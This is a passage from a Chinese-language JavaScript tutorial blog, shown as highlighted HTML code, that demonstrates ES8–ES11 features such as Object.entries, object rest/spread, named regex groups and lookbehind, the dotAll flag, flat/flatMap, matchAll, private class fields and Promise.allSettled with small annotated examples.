operator">:</span> <span class="token string">'张小6'</span><span class="token punctuation">,</span>    area<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'河南郑州'</span><span class="token punctuation">,</span><span class="token string">'湖北武汉'</span><span class="token punctuation">,</span><span class="token string">'山西晋城'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    hobby<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'写bug'</span><span class="token punctuation">,</span><span class="token string">'敲bug'</span><span class="token punctuation">,</span><span class="token string">'掉头发'</span><span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//获取对象的所有键</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//['name', 'area', 'hobby']</span>  <span class="token comment">//获取所有对象的值</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//['张小6', Array(3), Array(3)]</span></code></pre></p><h3 id="2-Object-entries"><a href="#2-Object-entries" class="headerlink" title="2.  Object.entries"></a>2.  Object.entries</h3><p> Object.entries()方法返回一个给定对象自身可遍历属性 [key,value] 的数组<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   name<span class="token operator">:</span> <span class="token string">'张小6'</span><span class="token punctuation">,</span>   area<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'河南郑州'</span><span class="token punctuation">,</span><span class="token string">'湖北武汉'</span><span class="token punctuation">,</span><span class="token string">'山西晋城'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   hobby<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'写bug'</span><span class="token punctuation">,</span><span class="token string">'敲bug'</span><span class="token punctuation">,</span><span class="token string">'掉头发'</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span> <span class="token comment">//返回对象可遍历[key,value]的数组</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// [Array(2), Array(2), Array(2)]</span> <span class="token comment">/*   0: (2) ['name', '张小6']   1: (2) ['area', Array(3)]   2: (2) ['hobby', Array(3)] */</span></code></pre></p><h3 id="3-Object-getOwnPropertyDescriptors"><a href="#3-Object-getOwnPropertyDescriptors" class="headerlink" title="3. Object.getOwnPropertyDescriptors"></a>3. Object.getOwnPropertyDescriptors</h3><p> 该方法返回指定对象所有自身属性的描述对象<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   name<span class="token operator">:</span> <span class="token string">'张小6'</span><span class="token punctuation">,</span>   area<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'河南郑州'</span><span class="token punctuation">,</span><span class="token string">'湖北武汉'</span><span class="token punctuation">,</span><span class="token string">'山西晋城'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   hobby<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'写bug'</span><span class="token punctuation">,</span><span class="token string">'敲bug'</span><span class="token punctuation">,</span><span class="token string">'掉头发'</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span> <span class="token comment">//返回对象自身属性的描述对象</span> <span class="token comment">//(自己理解：返回的自身属性中值中有描述该属性的值)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;name: &#123;…&#125;, area: &#123;…&#125;, hobby: &#123;…&#125;&#125;</span> <span class="token comment">/* 对象自身属性的描述对象    area: &#123;value: Array(3), writable: true, enumerable: true, configurable: true&#125;   hobby: &#123;value: Array(3), writable: true, enumerable: true, configurable: true&#125;   name: &#123;value: '张小6', writable: true, enumerable: true, configurable: true&#125; */</span><span class="token comment">//Object.create(参数1，参数2)</span> <span class="token comment">//参数1:原型对象 参数2:描述对象 </span> <span class="token keyword">const</span> zxl <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>   <span class="token comment">//对象属性的描述对象 (Object.getOwnPropertyDescriptors()就是获取这个描述对象)</span>   name<span class="token operator">:</span> <span class="token punctuation">&#123;</span>     <span class="token comment">//设置值</span>     value<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span>     <span class="token comment">//属性特性</span>     writable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//是否可写</span>     configurable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//是否可以删除</span>     enumerable<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">//是否可以枚举</span>   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>zxl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//name: &#123;value: '张三', writable: true, enumerable: true, configurable: true&#125;</span></code></pre></p><h2 id="二十三、Rest-Spread-属性"><a href="#二十三、Rest-Spread-属性" class="headerlink" title="二十三、Rest/Spread 属性"></a>二十三、Rest/Spread 属性</h2><p> Rest 参数与 spread 扩展运算符在 ES6 中已经引入，不过 ES6 中只针对于数组,在ES9中为对象提供了像数组一样的rest参数和扩展运算符<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//Rest参数与spread扩展运算符在ES6中就已经列入了,不过ES6中只针对于数组</span><span class="token comment">//在ES9中为对象提供了像数组一样的rest参数和扩展运算符</span><span class="token keyword">function</span> <span class="token function">person</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span><span class="token operator">...</span>user<span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;height: 196, wh: '法外狂徒'&#125;</span><span class="token punctuation">&#125;</span><span class="token function">person</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span>  age<span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>  height<span class="token operator">:</span> <span class="token number">196</span><span class="token punctuation">,</span>  wh<span class="token operator">:</span> <span class="token string">'法外狂徒'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">const</span> f1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>q<span class="token operator">:</span> <span class="token string">'西游记'</span><span class="token punctuation">&#125;</span> <span class="token comment">//...f1 => q: '西游记'</span><span class="token keyword">const</span> f2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>w<span class="token operator">:</span> <span class="token string">'三国演义'</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> f3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>e<span class="token operator">:</span> <span class="token string">'红楼梦'</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> f4 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>r<span class="token operator">:</span> <span class="token string">'水浒传'</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span>f1<span class="token punctuation">,</span><span class="token operator">...</span>f2<span class="token punctuation">,</span><span class="token operator">...</span>f3<span class="token punctuation">,</span><span class="token operator">...</span>f4<span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token comment">//&#123;q: '西游记', w: '三国演义', e: '红楼梦', r: '水浒传'&#125;</span></code></pre></p><h2 id="二十四、正则表达式"><a href="#二十四、正则表达式" class="headerlink" title="二十四、正则表达式"></a>二十四、正则表达式</h2><h3 id="1-正则表达式命名捕获组"><a href="#1-正则表达式命名捕获组" class="headerlink" title="1. 正则表达式命名捕获组"></a>1. 正则表达式命名捕获组</h3><p> ES9 允许命名捕获组使用符号『?<code>&lt;name&gt;</code>』,这样获取捕获结果可读性更强<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//声明一个字符串</span>  <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">'&lt;a href="https://xiaoliu824.github.io/">张三&lt;/a>'</span>  <span class="token comment">//提取 url与 标签文本</span>  <span class="token comment">//(.*) 在写正则同时还可以对某些数据进行单独读取捕获</span>  <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;a href="(.*)">(.*)&lt;\/a></span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>    <span class="token comment">//exec方法返回一个数组</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0为匹配的字符串 1为url 2为标签文本</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment">//正则命名捕获分组 ?&lt;名>  对捕获的结果添加一个属性方便提取</span>  <span class="token keyword">let</span> str2 <span class="token operator">=</span> <span class="token string">'&lt;a href="https://xiaoliu824.github.io/">张三&lt;/a>'</span>  <span class="token keyword">const</span> reg2 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;a href="(?&lt;url>.*)">(?&lt;text>.*)&lt;\/a></span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>  <span class="token keyword">let</span> res <span class="token operator">=</span> reg2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token comment">//第一个和第二个的区别 第一个的groups为undefined 第二个groups有值</span></code></pre></p><h3 id="2-正则表达式反向断言"><a href="#2-正则表达式反向断言" class="headerlink" title="2. 正则表达式反向断言"></a>2. 正则表达式反向断言</h3><p> ES9 支持反向断言，通过对匹配结果前面的内容进行判断，对匹配进行筛选<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//断言</span><span class="token comment">//可以根据目标内容的前边和后边来对它做一个唯一性的识别</span><span class="token comment">//声明字符串</span><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">'js5211314你知道吗555啦啦啦'</span><span class="token punctuation">;</span><span class="token comment">//正向断言(根据当前匹配后边的内容来去判断前边内容是不是合法的,是不是满足条件的)</span><span class="token keyword">let</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\d+(?=啦)</span><span class="token regex-delimiter">/</span></span>  <span class="token comment">//判断后面的字是不是啦,如果是啦的话才满足条件</span><span class="token keyword">let</span> result <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">//['555', index: 13, input: 'js5211314你知道吗555啦啦啦', groups: undefined]</span><span class="token comment">//反向断言(根据当前匹配前面的内容来判断后边内容是不是合法的,是不是满足条件的)</span><span class="token comment">//(?&lt;=前边内容) 固定语法</span><span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;=吗)\d+</span><span class="token regex-delimiter">/</span></span><span class="token keyword">let</span> rest <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token comment">//['555', index: 13, input: 'js5211314你知道吗555啦啦啦', groups: undefined]</span></code></pre></p><h3 id="3-dotAll-模式"><a href="#3-dotAll-模式" class="headerlink" title="3.  dotAll 模式"></a>3.  dotAll 模式</h3><p> 正则表达式中点.匹配除回车外的任何单字符，标记『s』改变这种行为，允许行终止符出现<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//dot 本身有点的意思,在正则中.表示元字符,除换行符以外的任意单个字符</span>  <span class="token comment">//dotAll 想让.匹配任意字符</span>  <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;ul>               &lt;li>                &lt;a>科比&lt;/a>                &lt;p>24号&lt;/p>                &lt;/li>               &lt;li>                &lt;a>乔丹&lt;/a>                &lt;p>23号&lt;/p>                &lt;/li>            &lt;/ul></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token comment">//声明正则 \s(表示单个空白字符) </span>  <span class="token comment">//没有dotAll之前的情况</span>  <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;li>\s+&lt;a>(.*?)&lt;\/a></span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>  <span class="token comment">//执行匹配</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment">//dotAll模式,加了一个模式修正符s,加了s后,(.)能匹配任意字符</span>  <span class="token comment">// .*?表示禁止贪婪,</span>  <span class="token keyword">let</span> reg2 <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;li>.*?&lt;a>(.*?)&lt;\/a>.*?&lt;p>(.*?)&lt;\/p></span><span class="token regex-delimiter">/</span><span class="token regex-flags">sg</span></span>  <span class="token keyword">let</span> res<span class="token punctuation">;</span>  <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">while</span><span class="token punctuation">(</span>res <span class="token operator">=</span> reg2<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    data<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span> res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> num<span class="token operator">:</span> res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">// [&#123;…&#125;, &#123;…&#125;]</span>  <span class="token comment">// 0: &#123;name: '科比', num: '24号'&#125;</span>  <span class="token comment">// 1: &#123;name: '乔丹', num: '23号'&#125;</span></code></pre></p><h2 id="二十五、ES10新特性"><a href="#二十五、ES10新特性" class="headerlink" title="二十五、ES10新特性"></a>二十五、ES10新特性</h2><h3 id="1-Object-fromEntries"><a href="#1-Object-fromEntries" class="headerlink" title="1. Object.fromEntries"></a>1. Object.fromEntries</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//Object.fromEntries创建一个对象,它需要一个参数,参数为一个二维数组或Map</span>   <span class="token comment">//二维数组</span>   <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span><span class="token string">'wh'</span><span class="token punctuation">,</span><span class="token string">'法外狂徒'</span><span class="token punctuation">]</span>   <span class="token punctuation">]</span>   <span class="token keyword">let</span> peo <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment">//将二维数组转化为对象</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>peo<span class="token punctuation">)</span> <span class="token comment">//&#123;name: '张三', wh: '法外狂徒'&#125;</span>   <span class="token comment">//Map</span>   <span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   m<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'张小6'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">let</span> xl <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xl<span class="token punctuation">)</span> <span class="token comment">//&#123;name: '张小6'&#125;</span>   <span class="token comment">//Object.entries 将一个对象转化为一个二维数组</span>   <span class="token keyword">const</span> zs <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>     name<span class="token operator">:</span> <span class="token string">'张龙'</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zs<span class="token punctuation">)</span> <span class="token comment">//[['name', '张龙']]</span></code></pre><h3 id="2-trimStart-和-trimEnd"><a href="#2-trimStart-和-trimEnd" class="headerlink" title="2. trimStart 和 trimEnd"></a>2. trimStart 和 trimEnd</h3>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//trim 清除字符串两侧的空白字符</span><span class="token comment">//trimStart() 清除字符串左侧空白</span><span class="token comment">//trimEnd() 清除字符串左侧空白</span><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">'    张小6来      '</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trimStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//清除字符串左侧空格</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trimEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">//清除字符串左侧空格</span></code></pre><h3 id="3-Array-prototype-flat-与-flatMap"><a href="#3-Array-prototype-flat-与-flatMap" class="headerlink" title="3. .Array.prototype.flat 与 flatMap"></a>3. .Array.prototype.flat 与 flatMap</h3>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//flat 将多维数组转化为低维数组</span><span class="token comment">//flat(参数) 参数默认是1,参数为深度,是一个数字</span><span class="token keyword">let</span> arr<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//将二维数组转化为一维数组</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9]</span><span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//将三维数组转换成一维数组</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[1, 2, 4, 6, 9, 'z', 'x', 1, 'q', 'w']</span><span class="token keyword">const</span> sz<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token comment">//map方法返回一个新数组,如果map返回的是一个多维数组,可以用flatMap将它变成一个一维的</span><span class="token keyword">const</span> res <span class="token operator">=</span> sz<span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">[</span>item <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> </code></pre><h3 id="4-Symbol-prototype-description"><a href="#4-Symbol-prototype-description" class="headerlink" title="4. Symbol.prototype.description"></a>4. Symbol.prototype.description</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//description属性 获取Symbol的描述字符串</span>  <span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>description<span class="token punctuation">)</span> <span class="token comment">//张三</span></code></pre><h2 id="二十六、ES11新特性"><a href="#二十六、ES11新特性" class="headerlink" title="二十六、ES11新特性"></a>二十六、ES11新特性</h2><h3 id="1-String-prototype-matchAll"><a href="#1-String-prototype-matchAll" class="headerlink" title="1. String.prototype.matchAll"></a>1. String.prototype.matchAll</h3>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//matchAll 这个方法用来得到正则批量匹配的结果</span> <span class="token comment">//返回的结果是一个可迭代对象</span> <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"> &lt;ul>     &lt;li>       &lt;a>张三&lt;/a>       &lt;p>法外狂徒&lt;/p>     &lt;/li>     &lt;li>       &lt;a>李四&lt;/a>       &lt;p>狂徒师弟&lt;/p>     &lt;/li> &lt;/ul></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span> <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;li>.*?&lt;a>(.*?)&lt;\/a>.*?&lt;p>(.*?)&lt;\/p></span><span class="token regex-delimiter">/</span><span class="token regex-flags">sg</span></span> <span class="token keyword">const</span> result <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回一个可以迭代的对象(可以用for...of进行遍历、可以用扩展运算符将其展开)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment">// for(let v of result) &#123;</span> <span class="token comment">//   console.log(v)</span> <span class="token comment">// &#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>result<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h3 id="2-类的私有属性"><a href="#2-类的私有属性" class="headerlink" title="2. 类的私有属性"></a>2. 类的私有属性</h3><p> 私有属性,对属性的一种封装,不被外部直接操作<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//私有属性可以理解为</span>  <span class="token comment">//一个女孩子,它是一个对象(语言上的对象),她有一些属性就是不能直接被别人访问的(体重、年龄)</span>  <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//公有属性</span>    name<span class="token punctuation">;</span>    <span class="token comment">//私有属性 前面必须加#</span>    #age<span class="token punctuation">;</span>    #weight<span class="token punctuation">;</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>weight</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>#age <span class="token operator">=</span> age<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>#weight <span class="token operator">=</span> weight<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//在类内部可以访问到,类外部不可以访问</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#weight<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> girl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">'45kg'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>girl<span class="token punctuation">)</span> <span class="token comment">//&#123;name: '小红', #age: 18, #weight: '45kg'&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>girl<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//小红</span>  <span class="token comment">// console.log(girl.#age); //在类外部不能访问,在类里面可以访问</span>  girl<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></p><h3 id="3-Promise-allSettled"><a href="#3-Promise-allSettled" class="headerlink" title="3. Promise.allSettled"></a>3. Promise.allSettled</h3>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//Promise.allSettled 该方法接收一个Promise的数组</span><span class="token comment">//返回的结果也是一个Promise对象,</span><span class="token comment">//不过,返回的结果(不管中间有没有失败的promise)永远都是成功的状态,</span><span class="token comment">//成功的值是数组中每个promise的结果状态(成功和失败)和结果值</span><span class="token keyword">let</span> p <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'商品数据1'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token 